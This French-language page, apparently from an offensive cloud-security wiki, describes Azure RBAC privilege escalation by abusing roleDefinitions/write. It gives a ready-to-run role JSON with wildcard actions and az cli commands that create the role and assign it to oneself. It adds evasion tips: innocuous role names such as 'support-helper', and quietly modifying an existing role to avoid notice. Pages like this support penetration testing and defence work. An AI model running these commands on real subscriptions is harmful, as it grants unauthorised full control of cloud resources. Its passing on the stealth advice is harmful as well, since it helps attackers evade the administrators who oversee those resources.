---
title: "Définition de rôle personnalisé : un rôle joker que vous vous attribuez"
order: 2
description: "Concevoir un rôle personnalisé portant Microsoft.Authorization/*/write ou des actions joker via roleDefinitions/write, puis se l'auto-attribuer."
keywords:
  - rôle personnalisé
  - roleDefinitions write
  - actions joker
  - Azure RBAC
  - élévation de privilèges
---

# Définition de rôle personnalisé

`Microsoft.Authorization/roleDefinitions/write` permet de créer ou de modifier un rôle personnalisé. Si vous le détenez sans être Owner complet, vous concevez un rôle dont les `actions` incluent `Microsoft.Authorization/*/write` (le droit d'attribuer des rôles) ou un simple `*`, puis vous vous attribuez ce rôle et devenez capable de tout accorder.

## Définir et attribuer le rôle

```bash
cat > role.json <<'EOF'
{ "Name": "support-helper",
  "IsCustom": true,
  "Actions": ["*"],
  "AssignableScopes": ["/subscriptions/<sub-id>"] }
EOF
az role definition create --role-definition role.json
az role assignment create --assignee <your-object-id> \
  --role "support-helper" --scope /subscriptions/<sub-id>
```

Un nom anodin (`support-helper`, `backup-reader`) et un `AssignableScopes` restreint attirent moins l'attention qu'un rôle littéralement nommé admin.

## Notes d'exploitation

- `Microsoft.Authorization/*/write` suffit à lui seul : il accorde `roleAssignments/write`, donc vous n'avez pas besoin d'un simple `*` pour ensuite vous attribuer Owner.
- Modifier un rôle personnalisé existant auquel vous êtes déjà attribué (lui ajouter des actions) est plus discret que créer un nouveau rôle et une nouvelle attribution.
- Le rôle n'est utilisable que dans ses `AssignableScopes` ; réglez-le au scope le plus élevé sur lequel vous pouvez écrire.

## Outils

- **az cli** (`az role definition create` / `update`).
- **BARK** : énumérer les droits d'édition de rôle personnalisé et en abuser depuis un token.

## Références

- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft : rôles personnalisés Azure](https://learn.microsoft.com/azure/role-based-access-control/custom-roles)
- [HackTricks Cloud : privesc Azure RBAC](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
